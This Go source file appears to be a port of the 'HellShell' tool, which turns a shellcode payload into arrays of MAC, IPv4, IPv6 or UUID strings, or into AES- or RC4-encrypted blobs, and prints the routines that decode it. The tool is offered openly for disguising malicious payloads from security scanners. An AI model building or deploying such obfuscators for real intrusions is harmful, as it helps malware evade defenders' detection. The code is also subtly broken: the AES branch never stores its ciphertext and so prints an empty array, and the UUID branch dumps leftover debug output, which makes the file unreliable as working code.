package main

import (
	"bytes"
	"fmt"
	"github.com/overflow0x93/hellshell/pkg/common"
	"github.com/overflow0x93/hellshell/pkg/deobfuscation"
	"github.com/overflow0x93/hellshell/pkg/io"
	"github.com/overflow0x93/hellshell/pkg/obfuscation"
	"github.com/overflow0x93/hellshell/pkg/stringfunctions"
	"os"
)

// Array of supported output (supported input argv[2] encryption/obfuscation type)
var SupportedOutput = []string{"mac", "ipv4", "ipv6", "uuid", "aes", "rc4"}

// AppendInputPayload appends payload to make its size a multiple of the given value.
func AppendInputPayload(multipleOf int, payload []byte) ([]byte, error) {
	appendSize := len(payload) + multipleOf - (len(payload) % multipleOf)
	appendedPayload := bytes.Repeat([]byte{0x90}, appendSize)
	copy(appendedPayload, payload)
	return appendedPayload, nil
}

// PrintHelp prints the help message.
func PrintHelp(argv0 string) int {
	fmt.Println("\t\t\t ###########################################################")
	fmt.Println("\t\t\t # HellShell - Designed By MalDevAcademy @NUL0x4C | @mrd0x #")
	fmt.Println("\t\t\t ###########################################################\n")
	fmt.Printf("[!] Usage: %s <Input Payload FileName> <Enc/Obf *Option*> \n", argv0)
	fmt.Println("[i] Options Can Be : ")
	fmt.Println("\t1.>>> \"mac\"     ::: Output The Shellcode As A Array Of Mac Addresses  [FC-48-83-E4-F0-E8]")
	fmt.Println("\t2.>>> \"ipv4\"    ::: Output The Shellcode As A Array Of Ipv4 Addresses [252.72.131.228]")
	fmt.Println("\t3.>>> \"ipv6\"    ::: Output The Shellcode As A Array Of Ipv6 Addresses [FC48:83E4:F0E8:C000:0000:4151:4150:5251]")
	fmt.Println("\t4.>>> \"uuid\"    ::: Output The Shellcode As A Array Of UUid Strings   [FC4883E4-F0E8-C000-0000-415141505251]")
	fmt.Println("\t5.>>> \"aes\"     ::: Output The Shellcode As A Array Of Aes Encrypted Shellcode With Random Key And Iv")
	fmt.Println("\t6.>>> \"rc4\"     ::: Output The Shellcode As A Array Of Rc4 Encrypted Shellcode With Random Key")
	fmt.Println("\n\n[i] ")
	return -1
}

func main() {
	// Data to help us in dealing with user's input
	var dwType int
	bSupported := false

	// Variables used for holding data on the read payload
	var pPayloadInput []byte
	var dwPayloadSize int
	_ = dwPayloadSize
	// Just in case we needed to append our input payload:
	var pAppendedPayload []byte
	var dwAppendedSize int
	_ = dwAppendedSize
	// Variables used for holding data on the encrypted payload (aes/rc4)
	var pCipherText []byte
	var dwCipherSize int
	_ = dwCipherSize
	// Checking input
	if len(os.Args) != 3 {
		os.Exit(PrintHelp(os.Args[0]))
	}

	// Verifying input
	for _, output := range SupportedOutput {
		if os.Args[2] == output {
			bSupported = true
			break
		}
	}

	if !bSupported {
		fmt.Printf("<<<!>>> \"%s\" Is not Valid Input <<<!>>>\n", os.Args[2])
		os.Exit(PrintHelp(os.Args[0]))
	}

	// Reading input payload
	var err error
	pPayloadInput, err = io.ReadPayloadFile(os.Args[1])
	if err != nil {
		fmt.Println("Error reading payload file:", err)
		os.Exit(-1)
	}

	// Initialize the possible append variables
	pAppendedPayload = pPayloadInput
	dwAppendedSize = len(pPayloadInput)
	//ppDAddress := []byte{}

	switch os.Args[2] {
	case "mac":
		if len(pPayloadInput)%6 != 0 {
			pAppendedPayload, err = AppendInputPayload(6, pPayloadInput)
			if err != nil {
				fmt.Println("Error appending payload:", err)
				os.Exit(-1)
			}
			dwAppendedSize = len(pAppendedPayload)
		}

		obfuscation.GenerateMacOutput(pAppendedPayload)
		dwType = common.MACFuscation

	case "ipv4":
		if len(pPayloadInput)%4 != 0 {
			pAppendedPayload, err = AppendInputPayload(4, pPayloadInput)
			if err != nil {
				fmt.Println("Error appending payload:", err)
				os.Exit(-1)
			}
			dwAppendedSize = len(pAppendedPayload)
		}

		obfuscation.GenerateIpv4Output(pAppendedPayload)
		dwType = common.IPv4Fuscation

	case "ipv6":
		if len(pPayloadInput)%16 != 0 {
			pAppendedPayload, err = AppendInputPayload(16, pPayloadInput)
			if err != nil {
				fmt.Println("Error appending payload:", err)
				os.Exit(-1)
			}
			dwAppendedSize = len(pAppendedPayload)
		}

		obfuscation.GenerateIpv6Output(pAppendedPayload)
		dwType = common.IPv6Fuscation

	case "uuid":
		if len(pPayloadInput)%16 != 0 {
			pAppendedPayload, err = AppendInputPayload(16, pPayloadInput)
			if err != nil {
				fmt.Println("Error appending payload:", err)
				os.Exit(-1)
			}
			dwAppendedSize = len(pAppendedPayload)
		}
		output := obfuscation.GenerateUuidOutput(pAppendedPayload)

		dwType = common.UUIDFuscation
		//pDSize := len(output)
		deob, err := deobfuscation.UuidDeobfuscation(output) //, &ppDAddress, &pDSize)
		if err != nil {
			fmt.Println("Error decoding UUID payload:", err)
		}
		fmt.Println(deob)
		fmt.Println(string(deob))

	case "aes":
		key := common.GenerateRandomBytes(common.AESKeySize)
		iv := common.GenerateRandomBytes(common.AESIVSize)
		keyCopy := make([]byte, len(key))
		ivCopy := make([]byte, len(iv))
		copy(keyCopy, key)
		copy(ivCopy, iv)

		common.SimpleEncryption(pPayloadInput, key, iv)
		dwCipherSize = len(pCipherText)

		stringfunctions.PrintDecodeFunctionality(common.AESEncryption)
		common.PrintHexData("AesCipherText", pCipherText)
		common.PrintHexData("AesKey", keyCopy)
		common.PrintHexData("AesIv", ivCopy)

	case "rc4":
		key := common.GenerateRandomBytes(common.RC4KeySize)
		keyCopy := make([]byte, len(key))
		copy(keyCopy, key)

		common.Rc4EncryptionViSystemFunc032(key, pPayloadInput)
		stringfunctions.PrintDecodeFunctionality(common.RC4Encryption)
		common.PrintHexData("Rc4CipherText", pPayloadInput)
		common.PrintHexData("Rc4Key", keyCopy)
	}

	fmt.Println("\n\n")

	if dwType != 0 {
		stringfunctions.PrintDecodeFunctionality(dwType)
	}

	os.Exit(0)
}
